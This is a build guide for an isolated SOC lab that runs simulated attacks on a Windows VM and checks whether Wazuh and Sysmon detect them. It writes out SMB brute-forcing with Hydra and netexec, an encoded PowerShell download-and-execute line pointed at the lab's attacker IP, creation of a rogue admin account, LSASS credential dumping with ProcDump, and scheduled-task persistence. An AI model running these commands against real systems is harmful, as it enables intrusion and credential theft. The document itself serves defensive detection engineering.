# Build Guide

This document describes how the lab environment was built and configured, including two configuration issues that were discovered and fixed along the way. It is written so the environment can be reproduced from scratch.

## Environment

| Machine | Role | IP Address | Network |
|---|---|---|---|
| Windows 10/11 VM | Target host | 192.168.56.10 | Internal network "soclab" |
| Kali Linux VM | Attacker host | 192.168.56.20 (DHCP later reassigned it to 192.168.56.102) | Internal network "soclab" |
| Wazuh manager | SIEM | 192.168.56.1 (host machine) | Reachable from both VMs |

All three machines sit on an isolated internal network with no route to the internet or the host's home network.

**Note:** the Windows VM's firewall blocks ICMP by default. Enable the built-in rule "File and Printer Sharing (Echo Request - ICMPv4-In)" before expecting the Kali VM to be able to ping it.

Static IP configuration:
```
# Windows VM
netsh interface ipv4 set address name="Ethernet" static 192.168.56.10 255.255.255.0

# Kali VM
sudo ip addr add 192.168.56.20/24 dev eth0
```

**Note:** DHCP can reassign the Kali VM's address mid-session even after a static assignment. Don't assume the attacker's source IP in Wazuh alerts matches what was configured at the start; verify it directly from the event data (`data.win.eventdata.ipAddress`). In this environment it shifted to 192.168.56.102 partway through testing.

## Step 1: Deploy Wazuh (Docker)

```
git clone https://github.com/wazuh/wazuh-docker.git -b v4.14.7
cd wazuh-docker/single-node/
docker compose -f generate-indexer-certs.yml run --rm generator
docker compose up -d
```
The dashboard is available at `https://192.168.56.1`.

To retrieve the custom rules file from the manager container at any point:
```powershell
docker cp single-node-wazuh.manager-1:/var/ossec/etc/rules/local_rules.xml .\local_rules.xml
```

## Step 2: Install Sysmon and the Wazuh agent

```
Sysmon64.exe -accepteula -i sysmonconfig-export.xml
Start-Service -Name "WazuhSvc"
```

**Configuration issue: ProcessAccess logging is disabled by default.** The standard SwiftOnSecurity Sysmon configuration ships with `ProcessAccess` (Event ID 10) completely empty and disabled, since it can generate significant log volume. An empty include block means Windows logs nothing for that event type at all, not just LSASS access, which silently breaks credential-dumping detection (Step 4.4) unless corrected.

Change this in `sysmonconfig-export.xml`:
```xml
<RuleGroup name="" groupRelation="or">
    <ProcessAccess onmatch="include">
        <!-- empty by default -->
    </ProcessAccess>
</RuleGroup>
```
to this:
```xml
<RuleGroup name="" groupRelation="or">
    <ProcessAccess onmatch="include">
        <TargetImage condition="end with">\lsass.exe</TargetImage>
    </ProcessAccess>
</RuleGroup>
```
Reload Sysmon's configuration (`sysmon64.exe -c sysmonconfig-export.xml`) before proceeding to Step 4.4. Skipping this step is the most common reason for seeing zero ProcessAccess events later.

## Step 3: Verify the logging pipeline

Before running any attack simulations, generate some baseline activity (open PowerShell, log out and back in) and confirm the events reach Wazuh's Discover tab (`wazuh-alerts-*`). Confirming events locally in Windows Event Viewer is not sufficient proof the pipeline works end to end. Also confirm that `ossec.conf` on the agent includes a `<localfile>` entry watching the Sysmon channel, since the default agent install can omit it.

## Step 4: Simulate the attacker techniques

Unless noted otherwise, commands run on the Windows VM.

### 4.1 Brute-force login (T1110)
```
# From Kali
echo -e 'password1\npassword123\nletmein\nqwerty123\nCorrectHorse!' > /tmp/passlist.txt
hydra -l paritvr -P /tmp/passlist.txt smb://192.168.56.10
```
If Hydra's SMB module fails to parse the response, use netexec as a fallback:
```
netexec smb 192.168.56.10 -u paritvr -p /tmp/passlist.txt
```

### 4.2 Suspicious encoded PowerShell (T1059.001)
```powershell
$cmd = 'IEX (New-Object Net.WebClient).DownloadString(''http://192.168.56.20/malicious.ps1'')'
$bytes = [System.Text.Encoding]::Unicode.GetBytes($cmd)
$encoded = [Convert]::ToBase64String($bytes)
powershell -enc $encoded
```
The download fails with "Unable to connect to the remote server" unless a listener is running on Kali (`python3 -m http.server 80`). This is expected; the encoded command still executes and still generates a log entry regardless of whether the download succeeds.

### 4.3 New local administrator account (T1098 / T1136.001)
```
net user attacker Passw0rd! /add
net localgroup administrators attacker /add
```

### 4.4 Credential dumping via ProcDump (T1003.001)
Download ProcDump:
```powershell
Invoke-WebRequest -Uri "https://download.sysinternals.com/files/Procdump.zip" -OutFile "C:\Tools\Procdump.zip"
Expand-Archive "C:\Tools\Procdump.zip" -DestinationPath "C:\Tools\Procdump"
```
Then, from an elevated prompt:
```
C:\Tools\Procdump\procdump64.exe -accepteula -ma lsass.exe C:\Windows\Temp\lsass_dump.dmp
```
Windows Defender may block this outright with real-time protection enabled; that is itself a valid detection outcome worth documenting. On a fully isolated, offline VM, temporarily disabling real-time protection for this one test is a reasonable trade-off.

This step depends on the Step 2 Sysmon fix being in place; without it, no ProcessAccess evidence is produced regardless of whether the dump succeeds. Each attempt completed successfully per ProcDump's own output (54-72 MB dumps written), and Windows Defender's behavioral engine independently flagged the activity as `Behavior:Win32/DumpLsass.A!attk`.

### 4.5 Scheduled task persistence (T1053.005) — descoped
```
schtasks /create /tn "Updater" /tr calc.exe /sc onlogon
```
This technique was executed but its detection was not carried through to the final write-ups, to keep the project scope focused. Remove the task afterward if it's still present:
```
schtasks /delete /tn "Updater" /f
```

## Step 5: Detection results

Three of the four techniques were caught by Wazuh's built-in rules without any custom detection logic.

| Technique | Detection | Rule(s) | Notes |
|---|---|---|---|
| 4.1 Brute-force login | Built-in | Windows Event ID 4625 | Five attempts, 47ms apart, subStatus 0xc000006a |
| 4.2 Encoded PowerShell | Custom | Rule 100002, level 12 | The built-in ruleset does not flag `-enc` usage on its own |
| 4.3 New admin account | Built-in | Rules 60109, 60170, 60154 | Severity tiering distinguishes routine account changes from privilege escalation |
| 4.4 Credential dumping | Raw evidence + optional custom rule 100004 | Built-in rule 92900 does not fire | See below |

**Credential-dumping detection gap.** Rule 92900 is designed to catch this exact technique but never fired, and the reason is a stale allowlist rather than a broken pipeline. The rule's own definition matches `GrantedAccess` values of only `0x1010` or `0x40`; a `rule.id:92900` query in Discover returns zero hits across the full test window despite the dump completing successfully (confirmed by ProcDump's own output and independently corroborated by Windows Defender's alert). Separately, other Sysmon Event 10 records captured on the same host — for example, Windows Defender's own `MsMpEng.exe` accessing lsass.exe — show `GrantedAccess: 0x1FFFFF`, a value the rule's allowlist does not cover. This is direct evidence that ordinary, currently-running Windows processes generate access masks the rule was never built to recognize. The raw Sysmon Event 10 record for the ProcDump-to-lsass access itself was not captured on screen, so no specific access-mask value is claimed for that individual event; the finding rests on the rule's documented logic, its confirmed zero-fire rate, and real supporting evidence from the same host.

## Step 6: Document the findings

Each technique is documented as a short investigation write-up covering: alert summary, evidence, MITRE ATT&CK mapping, impact, and response. See the repository structure guide for where these files live.
